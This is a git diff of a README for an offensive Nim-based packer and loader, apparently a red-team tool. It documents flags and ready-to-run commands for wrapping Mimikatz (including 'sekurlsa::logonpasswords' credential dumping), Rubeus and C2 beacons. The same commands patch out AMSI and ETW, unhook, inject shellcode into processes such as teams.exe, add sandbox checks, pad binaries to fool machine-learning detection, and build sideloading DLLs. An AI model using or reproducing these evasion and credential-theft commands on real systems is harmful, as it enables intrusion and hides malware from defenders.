@@ -54,11 +54,14 @@ osslsigncode - for example from [here](https://github.com/mtrojnar/osslsigncode/
 
 I will not give Support for issues in the third party tools which are used here. So please open up an issue in the corresponsing repositories if you're facing problems with them. Third party tools in use:
 
-- [Donut](https://github.com/TheWover/donut)
-- [Denim](https://github.com/moloch--/denim)
+- [Donut](https://github.com/S4ntiagoP/donut/tree/syscalls)
+- [Denim](https://github.com/S3cur3Th1sSh1t/denim)
 - [LimeLighter](https://github.com/Tylous/Limelighter)
 - [Callobfuscator](https://github.com/d35ha/CallObfuscator)
 - [NimlineWhispers3](https://github.com/klezVirus/NimlineWhispers3)
+- [Koppeling](https://github.com/monoxgas/Koppeling/)
+
+You can either use my precompiled binaries or of course compile them your own from the above links.
 
 ### Usage
 
@@ -66,10 +69,10 @@ A Video - if you prefer that - can be found here:
 [https://youtu.be/UHaIgdzqHDA](https://youtu.be/UHaIgdzqHDA)
 
 ```
-NimSyscall_Loader v 1.6
+NimSyscall_Loader v 1.7
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -84,8 +87,6 @@ Options:
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
-  --dll     Generate DLL instead of an exe
-  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
@@ -98,6 +99,19 @@ Options:
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
 
+[Shellcode retrieval options]
+
+  By default, the Loader will embed the Shellcode into the output file. There are two alternatives to this:  
+  --shellcodeFile shellcodefile    Filename to retrieve shellcode from - on Runtime (No embedding)
+  --shellcodeURL shellcodeURL    URL to retrieve shellcode from
+
+[DLL options]
+
+  --dll     Generate DLL instead of an executable
+      --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
+      --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
+      --clone value    Specify a local DLL to clone the API-Exports from
+
 [evasion]
 
   --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
@@ -106,13 +120,15 @@ Options:
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
+  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                      DiskSpace -> Only execute if c:\ disk space >= 200GB
                      MemorySpace -> Only execute if more than 4GB RAM available
                      Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
-        --domain targetdomain    Specify a domain for SandBox Evasion
+                     WindowChanges -> Checks, if the current Window has changed 7 or more times before executing the payload
+      --domain targetdomain    Specify a domain for SandBox Evasion
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                   reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
@@ -151,12 +167,14 @@ Options:
 [C# assembly Packing]
 
   --csharp    Encrypt a C# assembly to load it on runtime
+  --interactivePS    Load an interactive unmanaged Powershell Runspace (https://github.com/S3cur3Th1sSh1t-Sponsors/PwnPowershell)
+
 ```
 
 
 To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:
 
-```
+```batch
 NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
 ```
 
@@ -166,13 +184,13 @@ I found the reason for this behaviour. Don't ask me why but you cannot just take
 
 If you still want to embed the release version from github you can directly pass arguments like this:
 
-```
+```batch
 Packedmimikatz.exe coffee exit
 ```
 
 You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:
 
-```
+```batch
 NimSyscallLoader --file mimikatz.exe --peload --arguments "privilege::debug sekurlsa::logonpasswords exit"
 ``` 
 
@@ -180,65 +198,65 @@ Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loadin
 
 To pack Mimikatz for example and load it via syscall PE-Loader use the following:
 
-```
+```batch
 NimSyscallLoader --file=mimikatz.exe --peload
 ```
 
 To pack Shellcode for local injection:
 
-```
+```batch
 NimSyscallLoader --file=shellcode.bin --noAMSI
 ```
 
 To load shellcode into a remote process:
 
-```
+```batch
 NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
 ```
 
 To load a C# assembly:
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp
 ```
 To load a C# assembly with flags:
-```
+```batch
 NimSyscallLoader --file=Rubeus.exe --csharp --flags='hash /password:Aa1234'
 ```
 
 To load a C# assembly and use hellsgate for Syscall retrieval :
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
 ```
 
 To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:
 
-```
+```batch
 NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
 ```
 
 To add several thousand english words to bypass "Machine learning" detections:
 
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp --pump=words
 ```
 
 To use Syswhispers3 with/without jumper_randomized technique:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --syswhispers
 NimSyscallLoader --file=calc.bin --syswhispers --jump
 ```
 
 To encode shellcode with sgn before encrypting:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --sgn
 NimSyscallLoader --file=mimikatz.exe --peinject --sgn
 ```
 
 To spawn a custom process and inject into that afterwards + Patch AMSI/ETW in the remote process:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --remoteinject --customprocess rundll32.exe --remotepatchAMSI --remotePatchETW
 ```
 
@@ -259,6 +277,46 @@ amd64.windows.clang.linkerexe = "x86_64-w64-mingw32-clang"
 amd64.windows.clang.cpp.exe = "x86_64-w64-mingw32-clang++"
 amd64.windows.clang.cpp.linkerexe = "x86_64-w64-mingw32-clang++"
 ```
+
+### Handling Golang binaries with the Packer
+
+My custom `Nim-RUNPE` implementatation unfortunately cannot handle GoLang binaries at the moment. That's some strange bug within Nim, have to investigate deeper sometime. Definitely a rabbit whole, already spent a lot of time.
+
+For for the moment as workaround you can use `--peinject` to generate shellcode out of the golang binary to execute that either locally as executable or DLL.
+
+Example:
+
+```batch
+NimSyscallLoader --file chisel.exe --peinject --output ChiselPacked.exe
+
+or
+
+NimSyscallLoader --file chisel.exe --peinject --dll --arguments "client https://chisel-demo.herokuapp.com 3000" --output ChiselPacked.dll
+```
+
+You `have to` pass hardcoded arguments when using a DLL, because `PEInject` DLLs don't accept arguments from the target host. Remote injection is also possible but arguments cannot be hardcoded here.
+
+Defender detects Golang Packed binaries at the moment, pretty sure because of the very HIGH entropy (big payloads, so the binary contains 95% or more encrypted content). To avoid theese detections use either a DLL or `--pump` with any value.
+
+### DLL-Sideloading
+
+You can generate DLL-Sideloading capable Payloads with the flag `--clone DLLName`.
+
+For example the following would generate a `version.dll` with the API Exports of the original Windows `version.dll`:
+
+```batch
+NimSyscallLoader.exe --file C:\dontscan\calc64thread.bin --dll --clone C:\windows\system32\version.dll --output version.dll
+```
+
+This could be used for various legitimate signed binaries for Sideloading, such as `OneDriveUpdater.exe`, `slllauncher.exe` and more. Some points are important to note and you should take care yourself about them:
+
+* Using Shellcode with Exitfunction=Process will most likely lead to a crash in the Host binary
+* Using local injection will lead to a not starting binary, as the DLL will not finish with execution for C2-Payloads
+* There currently is a bug or Problem with C# payloads and Nim Sideloading. Those payloads are simply not executed when run locally (`--csharp` or `--peinject`), have to investigate
+* I cannot recommend using Nim DLL Sideloading Payloads with Teams.exe - had strange behaviours here for certain DLLs and Teams didn't start anymore in many cases. It's also detected by many EDR vendors in the meanwhile
+* TEST your payloads before using them. 
+
+Take your time to search for custom Sideloading binaries or use some of the known documented ones from a location such as [https://hijacklibs.net/](https://hijacklibs.net/).
 
 ### Custom Images or meta data
 
@@ -308,13 +366,15 @@ SleepyCrypt will not only encrypt the Shellcode but the whole PE-Stack, meaning 
 - [ ] PPID Spoofing for newly created processes
 - [ ] BlockDLLs for new processes
 - [ ] Patchless AMSI bypass (e.g. https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf)
+- [ ] AMSI bypass via NtCreateSection Hook (e.g. https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
 - [X] More ETW Patching for EtwNotificationRegister, EtwEventRegister, EtwEventWriteFull
 - [ ] Service binary support, like https://github.com/enthus1ast/nimWindowsService/
-- [ ] DLL hijacking switch for DLLMain with process attach
+- [X] DLL hijacking switch for DLLMain with process attach
 - [ ] Fix x86 bugs, mostly casting but some other strange behaviours
-- [ ] Add `--pump` null bytes in between like https://gitlab.com/ORCA000/entropyfix (Have to test, may cause crashes)
-- [ ] CPL Output files
-
+- [X] Add `--pump` null bytes in between like https://gitlab.com/ORCA000/entropyfix (Have to test, may cause crashes)
+- [X] CPL Output files
+- [ ] Decoy HTTP requests option
+- [ ] Download Shellcode from Webserver or read it from local file as alternative to embedding (default)
 
 
 ## CREDITS
@@ -331,3 +391,4 @@ SleepyCrypt will not only encrypt the Shellcode but the whole PE-Stack, meaning 
 - [X] [glynx](https://github.com/glynx) - Nim-RunPE hardcoded arguments Pull Request
 - [X] [moloch--](https://github.com/moloch--) - Denim
 - [X] [EdgeBalci](https://github.com/EgeBalci) - SGN
+- [X] [monoxgas](https://github.com/monoxgas) - Koppeling
